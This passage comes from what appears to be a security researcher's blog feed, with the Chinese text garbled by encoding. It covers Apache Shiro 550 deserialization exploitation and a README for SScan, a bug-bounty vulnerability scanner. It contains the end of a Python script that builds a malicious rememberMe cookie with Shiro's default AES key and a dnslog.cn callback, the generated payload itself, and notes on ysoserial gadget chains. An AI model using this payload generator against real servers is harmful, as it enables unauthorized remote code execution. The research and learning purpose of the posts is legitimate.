% BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># æ›¿æ¢dnslog </span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://5fzd8f.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line">        res = <span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">        fpw.write(res)</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç”Ÿæˆ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rememberMe=Y3M07legS/64hNfAmb+zfY1Ch/sXxGbop7rMR3YgWuFwTmdZEGj1q0oaHMowhUpUopo4XNjBkIDbn+w4Zhq0QO+9GXX4+hZA67NiM5U6sXcxtxLZCdlRB4JlrT8JrtTs+OyejDVh2HXLgI29lmMSDVoVW5OV3EHISFbFS+MmQv6JGqt60OZHxw6y1uhwYcWiRZ2kqGwDbNE/Xj+vNA1/5CdvnElY3jVvo8YJ8Suy8zznVuMlR2OsjksaHel8dXoUSXRiTAsMnn0SJIqKm7KI98YqTQaSn4F7VnEqaaNyciQwgOoOV/MphOWjVcTWsEDgdUjT5WgI+pJSZpX9JIo1XT75SPpWkiIw9Sseptaor5fsPMPNuk/lf5bWSpnwFTlTUuClsDJbOXjgvcew77i9tw==</span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢æ‰“æˆåŠŸ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521091957.png" alt="image-20210521084722601"></p>
<p>å…¶å®ä¸€å¼€å§‹æ˜¯å¤±è´¥çš„ï¼Œshiro550è‡ªå¸¦çš„åŒ…æ˜¯commons-collections3.2.1,åŸç”Ÿæƒ…å†µä¸‹ç›´æ¥ç”¨ysoserialæ‰“ï¼Œæ˜¯ä¸ä¼šæˆåŠŸçš„ï¼Œå…¶ä»–ä½ç½®ä¸­ç›´æ¥æ·»åŠ äº†<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521092002.png" alt="image-20210521091756305"></p>
<p>commons-collections4çš„åŒ…ï¼Œæ‰å¯ä»¥é¡ºç•…å¤ç°ã€‚è‡³äºä¸ºå•¥åŸç”Ÿçš„3.2.1ä¸èƒ½è§¦å‘æ¼æ´ï¼Œä»¥åŠå¯ä¸å¯ä»¥è§¦å‘æ¼æ´ï¼Œä¸‹ç¯‡æ–‡ç« å†åˆ†æã€‚</p>
<h2 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h2><p>Apache Shiro Java ååºåˆ—åŒ–æ¼æ´åˆ†æ <a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a> </p>
<p>Javaå®‰å…¨ä¹‹Shiro 550ååºåˆ—åŒ–æ¼æ´åˆ†æ <a href="https://www.anquanke.com/post/id/225442#h3-8">https://www.anquanke.com/post/id/225442#h3-8</a> </p>
<p>ysoserial <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–æ¼æ´åˆ†æ(äºŒ)-Shiro550</title>
    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
    <content><![CDATA[<blockquote>
<p>  è¿™æ˜¯ä¸€ç¯‡å¤±è´¥çš„æ–‡ç« ï¼Œè¦å­¦çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œé«˜çœ‹æˆ‘è‡ªå·±äº†ã€‚ç»ˆç©¶æ˜¯çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œ</p>
</blockquote>
<h2 id="0x00-çº é”™"><a href="#0x00-çº é”™" class="headerlink" title="0x00 çº é”™"></a>0x00 çº é”™</h2><p>é¦–å…ˆçº æ­£ä¸€ä¸‹ä¸Šç¯‡æ–‡ç« <a href="">Javaååºåˆ—åŒ–æ¼æ´åˆ†æ(ä¸€)-Shiro550</a>çš„é”™è¯¯é”™è¯¯ï¼Œä¸Šç¯‡æåˆ°dnslogä½¿ç”¨åŸç”Ÿç¯å¢ƒæ­å»ºæ²¡æœ‰æ‰“æˆåŠŸï¼Œè¿™æ˜¯<strong>é”™çš„</strong>ã€<strong>é”™çš„</strong>ã€<strong>é”™çš„</strong>ï¼Œå…¶å®æ˜¯å¯ä»¥æ‰“çš„ã€‚æˆ‘ç»™æé”™äº†ï¼Œ<strong>URLDNS</strong> è¿™ä¸ªåˆ©ç”¨é“¾æœ¬èº«ä¸ä¾èµ–äºä»»ä½•ç¬¬ä¸‰æ–¹åº“ï¼ŒåŒæ—¶ä¸é™åˆ¶jdkçš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥é€šå¸¸æ˜¯ç”¨æ¥æ£€æµ‹ååºåˆ—åŒ–çš„ç‚¹ï¼ˆç›®æ ‡å‡ºç½‘ï¼‰ï¼Œæˆ‘å½“æ—¶æ²¡æ‰“æˆåŠŸï¼Œæ˜¯å› ä¸ºæˆ‘åšå®éªŒæ—¶ï¼Œç”¨äº†<strong>åŒä¸€æ¡</strong>dnslogçš„urlæ‰“è¿‡ä¸€éï¼Œç¬¬äºŒéæ­»æ´»ä¸å‡ºç»“æœï¼Œå†™è¿™ç¯‡æ–‡ç« æ—¶åˆæµ‹äº†å‡ æ¬¡ï¼Œå‘ç°æ˜¯urlçš„é”…ï¼Œè¦ä¸åœçš„å˜æ¢æ‰ä¼šä¸€ç›´å‡ºç»“æœ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210524215703.png" alt="åŸç”Ÿçš„shiro550å¯ä»¥ä½¿ç”¨dnslogæ¢æµ‹"></p>
<blockquote>
<p>  Javaé»˜è®¤æœ‰TTLç¼“å­˜ï¼ŒDNSè§£æä¼šè¿›è¡Œç¼“å­˜ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå‡ºç°ç¬¬ä¸€æ¬¡æ”¶åˆ°DNSçš„logï¼Œåé¢å¯èƒ½æ”¶ä¸åˆ°çš„æƒ…å†µã€‚</p>
</blockquote>
<h2 id="0x01-åŸç”ŸShiro550æ‰§è¡Œå‘½ä»¤"><a href="#0x01-åŸç”ŸShiro550æ‰§è¡Œå‘½ä»¤" class="headerlink" title="0x01 åŸç”ŸShiro550æ‰§è¡Œå‘½ä»¤"></a>0x01 åŸç”ŸShiro550æ‰§è¡Œå‘½ä»¤</h2><p>å½“ä½¿ç”¨<strong>URLDNSé“¾</strong>æ‰“è¿‡å»ï¼Œåœ¨DNSLOGå¹³å°æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œå°±è¯´æ˜è¿™ä¸ªåœ°æ–¹å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>ä½†æ˜¯è¦åˆ©ç”¨çš„è¯è¿˜å¾—æ˜¯ä½¿ç”¨CCé“¾ç­‰åˆ©ç”¨é“¾å»è¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œï¼ˆshiro550ä¸­è‡ªå¸¦çš„æ˜¯cc3.2.1ç‰ˆæœ¬çš„ç»„ä»¶ï¼‰ã€‚</p>
<p>ç»è¿‡æµ‹è¯•<strong>ysoserial</strong>æ‹¥æœ‰çš„CommonsCollectionsåˆ©ç”¨é“¾ä»1-7éƒ½æ— æ³•æˆåŠŸæ‰§è¡Œå‘½ä»¤, éƒ½æ˜¯æŠ¥é”™<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211912.png" alt="image-20210528211554019"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211926.png" alt="image-20210525211529910"></p>
<p>æ— æ³•ååºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„ï¼Œç»å¸¸æ•²ä»£ç ï¼Œä¿®bugçš„éƒ½çŸ¥é“ï¼ŒæŠ¥é”™çš„ä½ç½®ä¸€èˆ¬éƒ½åœ¨æœ€ä¸‹è¾¹çš„ï¼Œå»çœ‹çœ‹</p>
<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> ç›´æ¥ç‚¹è¿‡å»çœ‹çœ‹<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211917.png" alt="image-20210526220345069"></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨<a href="">åˆæ¢Javaååºåˆ—åŒ–æ¼æ´(ä¸€)</a>ä¸­æåˆ°çš„é‡ç‚¹å‡½æ•°<strong>readObject()<strong>å‡½æ•°ï¼Œä½†æ˜¯åˆæœ‰ä¸€ç‚¹ç‚¹ä¸ä¸€æ ·ï¼Œå®ƒè¿™é‡Œæ˜¯</strong>new</strong>äº†ä¸€ä¸ª<strong>ClassResolvingObjectInputStream</strong>,è€Œéä¼ ç»Ÿçš„<strong>ObjectInputStream</strong> é—®é¢˜å°±å¯èƒ½å‡ºç°åœ¨è¿™é‡Œï¼Œå…¨å±€æœç´¢çœ‹ä¸‹<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211939.png" alt="image-20210526220837880"></p>
<p>è¿™é‡Œæ˜¯é€šè¿‡ <strong>ClassUtils.forName(osc.getName());<strong>æ¥åå°„è°ƒç”¨çš„ï¼Œè€Œå‰é¢éƒ½æ˜¯é€šè¿‡</strong>Class.forName(â€œjava.lang.Runtimeâ€);</strong> æ¥è¿›è¡Œåå°„æ‰§è¡Œå‘½ä»¤çš„<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211949.png" alt="image-20210526221020003"></p>
<p>ç›´æ¥åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ï¼Œç„¶åä½¿ç”¨CC2é“¾æ‰“ä¸€ä¸‹ï¼Œè°ƒè¯•åŠå¤©ä¹Ÿæ²¡çœ‹æ‡‚ï¼Œå¤ªèœäº†ï¼Œå…ˆè®°ä¸‹ å‚è€ƒæ–‡ç« ä¸­è¯´çš„æ˜¯</p>
<blockquote>
<p>  Shiro resovleClass ä½¿ç”¨çš„æ˜¯ClassLoader.loadClass()è€ŒéClass.forName()ï¼Œè€ŒClassLoader.loadClassä¸æ”¯æŒè£…è½½æ•°ç»„ç±»å‹çš„classã€‚</p>
</blockquote>
<p>åˆ«äººåœ¨ç¯å¢ƒä¸­å¼•å…¥äº†<code>commons-collections4.0</code>ï¼Œä½¿å¾—ysoserialçš„<code>CommonsCollections2</code>åˆ©ç”¨é“¾å¯ä»¥æˆåŠŸåˆ©ç”¨ã€‚è¿™æ˜¯å› ä¸º<code>CommonsCollections2</code>ç”¨çš„æ˜¯éæ•°ç»„å½¢å¼çš„åˆ©ç”¨é“¾ï¼Œåœ¨è¯¥åˆ©ç”¨é“¾ä¸Šæ²¡æœ‰å‡ºç°æ•°ç»„ç±»å‹çš„å¯¹è±¡ï¼Œè¿™ä½¿å¾—åœ¨shiroçš„ç¯å¢ƒä¸‹ï¼Œå¯ä»¥æ­£ç¡®æ‰§è¡Œå‘½ä»¤ã€‚ï¼ˆåç»­å­¦ä¹ è¿™æ¡é“¾ï¼‰</p>
<h2 id="0x01-æ„é€ æ–°çš„åˆ©ç”¨é“¾"><a href="#0x01-æ„é€ æ–°çš„åˆ©ç”¨é“¾" class="headerlink" title="0x01 æ„é€ æ–°çš„åˆ©ç”¨é“¾"></a>0x01 æ„é€ æ–°çš„åˆ©ç”¨é“¾</h2><p>æˆ‘ä¸ä¼šã€‚ã€‚ã€‚ çœ‹åŠå¤©è¿˜æ˜¯æ²¡çœ‹æ‡‚ï¼Œå‰ç½®çŸ¥è¯†ç¼ºçš„æœ‰ç‚¹å¤šï¼Œç›´æ¥æ”¾é“¾æ¥å§</p>
<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
<p>æ€»ç»“å°±æ˜¯åˆ©ç”¨é“¾ä¸­çš„<code>ChainedTransformer</code>è¿™ä¸ªç±»çš„åˆ©ç”¨æ˜¯æ— æ³•æˆåŠŸçš„ï¼Œå› ä¸ºå®ƒçš„ç±»å±æ€§<code>iTransformers</code>æ˜¯æ•°ç»„ç±»å‹çš„<code>Transformers</code>ï¼Œæœ€ç»ˆé€šè¿‡ä½¿ç”¨<code>TemplatesImpl.newTransformer</code>å‡½æ•°æ¥åŠ¨æ€<code>loadClass</code>æ„é€ å¥½çš„evil class bytes</p>
<p>é€šè¿‡å¤§ä½¬æ”¹é€ çš„<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 åˆ©ç”¨é“¾æ‰“ä¸€ä¸‹<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
<p>è¿™ä¸ªå›¾<strong>åˆæ˜¯å‡</strong>çš„ï¼Œæ·¦ï¼Œç”¨å¤§ä½¬çš„CC10é“¾æ‰“äº†ä¹‹åï¼Œçªç„¶æ€€ç–‘ä¹‹å‰çš„å‘½ä»¤æé”™äº†ï¼Œæˆ‘ä¹‹å‰æ˜¯ç”¨<code>whoami</code>æµ‹è¯•çš„ï¼Œæˆ‘æƒ³èµ·äº†macå‘½ä»¤æ‰§è¡Œä¸å¤ªä¸€æ ·ï¼Œé‡æ–°ç”¨<code>open -a Calculator</code>è¯•äº†ä¸€éï¼Œå‘ç°CC2é“¾åˆå¯ä»¥æˆåŠŸäº†ï¼Œç¬é—´å‡Œä¹±ï¼ˆå·²ç»æŠŠæ·»åŠ çš„commons-collections4.0ç‰ˆæœ¬ç»™æ³¨é‡Šäº†ï¼‰ï¼Œè¿™ä¸¤å¤©ä¸€ç›´åœ¨é‡æ–°æµ‹è¯•æ‰¾åŸå› ï¼Œé€šè¿‡é‡æ–°ä¸‹è½½shiroï¼Œåˆ‡æ¢ç‰ˆæœ¬é‡æ–°æ¥ä¸€éï¼ŒCC2å¹¶ä¸å¯ä»¥æ‰“åŸç”Ÿçš„shiro550ï¼Œç”¨å¤§ä½¬çš„CC10ä¹Ÿæ‰“ä¸å‡ºæ¥ï¼ŒåŸå› ä¹Ÿæ‰¾ä¸åˆ°ï¼Œå‰ç½®çŸ¥è¯†ç¼ºçš„å¤ªå¤šäº†ï¼Œå†æä¸‹å»ä¹Ÿæ˜¯æµªè´¹æ—¶é—´ã€‚</p>
<p>æœ€ç»ˆæ‰¾åˆ°æˆ‘ä¸ºå•¥å¯ä»¥æ‰“æˆåŠŸï¼Œå› ä¸ºæˆ‘åœ¨<code>shiro/samples/web</code>ç›®å½•ä¸‹ç”Ÿæˆè¿‡waråŒ…ï¼Œå½“æ—¶æ˜¯åœ¨æµ‹è¯•4.0ç‰ˆæœ¬RCEï¼Œç”Ÿæˆçš„targetç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œä¹‹åå¯åŠ¨çš„æ—¶å€™åº”è¯¥éƒ½æ˜¯ä½¿ç”¨targetç›®å½•ä¸‹çš„ä¸œè¥¿ï¼Œå³ä½¿å»é™¤4.0ç‰ˆæœ¬ä¾æ—§æ²¡ç”¨ï¼Œç”Ÿæˆçš„waråŒ…å¹¶æ²¡æœ‰æ”¹å˜è¿˜æ˜¯å¯ä»¥RCEçš„4.0ç‰ˆæœ¬ï¼Œæå¾—æˆ‘æ€€ç–‘äººç”Ÿã€‚è¿˜æœ‰è¯´<strong>JRMP</strong> è¿™ä¸ª<strong>Gadget</strong>å¯ä»¥æ‰“ï¼Œä¹Ÿæ˜¯åºŸäº†ï¼Œæ²¡æˆåŠŸã€‚</p>
<p>ä¸æäº†ï¼Œå¿ƒç´¯ï¼Œç­‰è¡¥å……å®ŒçŸ¥è¯†ï¼Œå†é‡æ–°æ¥å§</p>
<p>æ¥ä¸‹æ¥é€šè¿‡<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserialè¿™ä¸ªé¡¹ç›®æ¥å­¦ä¹ javaååºåˆ—åŒ–çš„åˆ©ç”¨é“¾å§ï¼Œæ…¢æ…¢æ¥å§ã€‚</a></p>
<h2 id="0x02-å‚è€ƒ"><a href="#0x02-å‚è€ƒ" class="headerlink" title="0x02 å‚è€ƒ"></a>0x02 å‚è€ƒ</h2><p>æ¨èä¸€ä¸ªChromeæ’ä»¶â€”<strong>Toby for Chrome</strong>ï¼Œé€‚åˆèˆä¸å¾—å…³æ ‡ç­¾é¡µï¼Œç•™å¾…åç»­ç ”ç©¶çš„ã€‚</p>
<p>ä¸­é€”å‚è€ƒçš„æ–‡ç« å¤ªå¤šäº†ï¼Œå°±ç”¨è¿™ä¸ªæ’ä»¶ç”Ÿæˆçš„åˆ†äº«é“¾æ¥å§</p>
<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
    <title>SScan  ä¸€æ¬¾srcæ¡æ´æ‰«æå™¨</title>
    <url>/2021/01/11/SScan/</url>
    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
<p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p>
<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä¸€æ¬¾srcæ¡æ´æ‰«æå™¨ï¼Œå› æ²¡æ—¶é—´æŒ–srcï¼Œæ¯•ç«ŸæŒ–srcæ˜¯ä¸ªè´¹æ—¶è´¹åŠ›çš„æ´»ï¼Œè‡ª19å¹´8æœˆèµ·å…¥å‘è‡³ä»Šï¼Œä¾é  <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> æ‰«æå‡ºçš„ä¿¡æ¯å’Œæ¼æ´ï¼Œåˆ©ç”¨ä¸šä½™æ—¶é—´ä»æ‰«ææŠ¥å‘Šä¸­çš„èµ„äº§<strong>æ¡æ´</strong>å’Œæ‰¾æ´ï¼Œå·²ç»3æ¬¡jdæœˆåº¦å‰åã€‚èŒå‘å‡ºè‡ªå·±å†™æ‰«æå™¨æŒ–æ´çš„å¿µå¤´ï¼Œè‡ªåŠ¨æŒ–ä¸€äº›ç®€å•æ¼æ´ï¼Œèµšç‚¹é›¶èŠ±é’±ï¼ŒåŒæ—¶æå‡ä¸€ä¸‹å¼€å‘èƒ½åŠ›ï¼Œæ¯•ç«Ÿæå®‰å…¨çš„ä¸èƒ½ä¸æ‡‚å¼€å‘ã€‚</p>
<p>ç›®å‰ <a href="https://github.com/yhy0/SScan">SScan</a> çš„ä¸»è¦é€»è¾‘è¿˜æ˜¯ <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>ã€‚</p>
<h3 id="ä½¿ç”¨æ•ˆæœå›¾"><a href="#ä½¿ç”¨æ•ˆæœå›¾" class="headerlink" title="ä½¿ç”¨æ•ˆæœå›¾"></a>ä½¿ç”¨æ•ˆæœå›¾</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p>
<p>æ‰«æç»“æŸåï¼Œç»“æœæŠ¥å‘Šåœ¨reportç›®å½•ä¸‹ï¼Œå¹¶ä¸”å­˜åœ¨æ¼æ´æ—¶ï¼Œé»˜è®¤ä¼šä½¿ç”¨æµè§ˆå™¨æ‰“å¼€æŠ¥å‘Š</p>
<h2 id="ä½¿ç”¨åŠå‚æ•°"><a href="#ä½¿ç”¨åŠå‚æ•°" class="headerlink" title="ä½¿ç”¨åŠå‚æ•°"></a>ä½¿ç”¨åŠå‚æ•°</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 SScan.py version                                æŸ¥çœ‹ç‰ˆæœ¬</span><br><span class="line">python3 SScan.py --<span class="built_in">help</span>                                 è·å–å¸®åŠ©</span><br><span class="line">python3 SScan.py --host example.com run                 å•ä¸ªç›®æ ‡</span><br><span class="line">python3 SScan.py --file domains.txt run                 è¯»å–ä¸€ä¸ª.txtæ–‡ä»¶</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/dirs/ run    è¯»å–ç›®å½•ä¸‹çš„æ‰€æœ‰.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   networkè®¾ç½®ä¸€ä¸ªå­ç½‘æ©ç (8 ~ 31)ï¼Œ</span><br><span class="line">                é…åˆä¸Šé¢3ä¸ªå‚æ•°ä¸­ä»»æ„ä¸€ä¸ªã€‚å°†æ‰«æTarget/MASK ç½‘ç»œä¸‹é¢çš„æ‰€æœ‰IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    åªä½¿ç”¨æŒ‡å®šè„šæœ¬ </span><br><span class="line"></span><br><span class="line">æ‚¨å¯ä»¥é€šè¿‡åœ¨ config/setting.py æ–‡ä»¶ä¸­æŒ‡å®šfofa apiä¿¡æ¯, è°ƒç”¨fofaæœç´¢æ›´å¤šçš„WebæœåŠ¡</span><br><span class="line"></span><br><span class="line">å…¶å®ƒå‚æ•°ï¼š</span><br><span class="line">    --t             æ‰«æçº¿ç¨‹æ•°, é»˜è®¤10ã€‚</span><br><span class="line">    --full          å¤„ç†æ‰€æœ‰å­ç›®å½•ã€‚ /x/y/z/è¿™æ ·çš„é“¾æ¥ï¼Œ/x/ /x/y/ä¹Ÿå°†è¢«æ‰«æï¼Œé»˜è®¤ä¸ºTrue</span><br><span class="line">    --crawl         çˆ¬å–ä¸»é¡µçš„&lt;a&gt;æ ‡ç­¾ï¼Œ é»˜è®¤ä¸ºTrue</span><br><span class="line">    --checkcdn      æ£€æŸ¥åŸŸåæ˜¯å¦å­˜åœ¨CDNï¼Œè‹¥å­˜åœ¨åˆ™ä¸å¯¹è§£æå‡ºçš„ipè¿›è¡Œè§„åˆ™å’Œè„šæœ¬æ¢æµ‹ï¼Œé»˜è®¤ä¸ºTrue</span><br><span class="line">    --browser       æ£€æµ‹å®Œæˆåï¼Œä½¿ç”¨é»˜è®¤æµè§ˆå™¨æ‰“å¼€æ‰«ææŠ¥å‘Šï¼Œé»˜è®¤ä¸ºTrue</span><br><span class="line">    --script        æŒ‡å®šè¦ä½¿ç”¨çš„è„šæœ¬ï¼Œ--script unauthorized_access_redis unauthorized_access_rsync, ... è„šæœ¬åœ¨scriptsç›®å½•ä¸‹</span><br><span class="line">    --rule          æŒ‡å®šè¦æ‰«æçš„è§„åˆ™ï¼Œ--rule RuleFileName1,RuleFileName2,... è§„åˆ™åœ¨rulesç›®å½•ä¸‹</span><br><span class="line">    --script_only   åªä½¿ç”¨è„šæœ¬è¿›è¡Œæ‰«æï¼Œä¸ä½¿ç”¨è§„åˆ™</span><br><span class="line">    --noscripts     ä¸ä½¿ç”¨è„šæœ¬æ‰«æ</span><br><span class="line">    --fofa       æ˜¯å¦ä½¿ç”¨fofaæ‰©å¤§ç›®æ ‡ï¼Œé»˜è®¤ä¸ºTrueï¼Œé€šè¿‡åœ¨lib/config/setting.py </span><br></pre></td></tr></table></figure>

<h2 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h2><ul>
<li><p><input checked="" disabled="" type="checkbox"> 
å¸¸è§ç›®å½•æ‰«æï¼Œæ¯”å¦‚å¤‡ä»½æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ç­‰ç­‰ï¼Œå…·ä½“è§<code>rules</code>ç›®å½•ä¸‹çš„è¯¦ç»†è§„åˆ™</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œæ¯”å¦‚.ideaã€ .gitã€.DS_Storeã€springbootç­‰ç­‰ï¼Œå…·ä½“è§<code>rules</code>ç›®å½•ä¸‹çš„è¯¦ç»†è§„åˆ™</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
åå°ç™»å½•é¡µé¢èµ„äº§å‘ç°</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
403é¡µé¢ç»•è¿‡ï¼Œå…·ä½“ç»•è¿‡è§„åˆ™åœ¨<code>lib/common/scanner.py</code>çš„196è¡Œçš„<code>bypass_403</code>å‡½æ•°</p>
<p>  ä½¿ç”¨BurpSuite å®éªŒå®¤<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> è¿›è¡Œæµ‹è¯•</p>
<p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
æ‰«ææŸä¸ªç½‘æ®µï¼Œæ¯”å¦‚é€šè¿‡ <code>--network 24</code> æŒ‡å®šæ‰«æCæ®µèµ„äº§ï¼Œè¿›è¡Œæ¼æ´å’Œä¿¡æ¯å‘ç°</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
è·³è¿‡å­˜åœ¨CDNçš„IPï¼Œå½“æ£€æµ‹åˆ°urlè§£æçš„IPç¬¦åˆCDNç‰¹å¾æ—¶ï¼Œä¸ä¼šå°†ipåŠ å…¥æ‰«æç›®æ ‡ä¸­ï¼Œåªä¼šæ‰«æurl</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
ä¸€äº›å¸¸è§æœªæˆæƒå’Œå¼±å£ä»¤æ£€æµ‹ï¼Œç›®å‰æ”¯æŒï¼š</p>
<p>  redisã€Hadoopã€Hadoop yarnã€dockerã€docker registry apiã€CouchDBã€ftpã€zookeeperã€elasticsearchã€memcachedã€mongodbã€rsyncã€jenkinsã€jbossçš„æœªæˆæƒè®¿é—®ï¼Œmysqlç©ºå£ä»¤ã€PostgreSQL ç©ºå£ä»¤ ï¼Œå…·ä½“è§<code>pocs/scripts</code> ç›®å½•</p>
<p>  å¯¹äºæ•°æ®åº“å£ä»¤æ£€æµ‹ï¼Œç›®å‰åªæ˜¯æ£€æµ‹æ˜¯å¦å­˜åœ¨ç©ºå£ä»¤æ£€æµ‹ï¼Œåç»­ä¼šè€ƒè™‘è¦ä¸è¦åŠ å…¥ä¸€äº›å¼±å£ä»¤ï¼Œè¿›è¡Œæ£€æµ‹ã€‚åƒè¿™æ · <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
å½“åœ¨<code> lib/config/setting.py</code>  æ–‡ä»¶ä¸­æŒ‡å®šfofa api ä¿¡æ¯æ—¶ï¼Œä¼šè°ƒç”¨fofaæ¥å£ï¼Œæœç´¢æ›´å¤šçš„WebæœåŠ¡</p>
</li>
</ul>
<h2 id="åç»­è®¡åˆ’"><a href="#åç»­è®¡åˆ’" class="headerlink" title="åç»­è®¡åˆ’"></a>åç»­è®¡åˆ’</h2><ul>
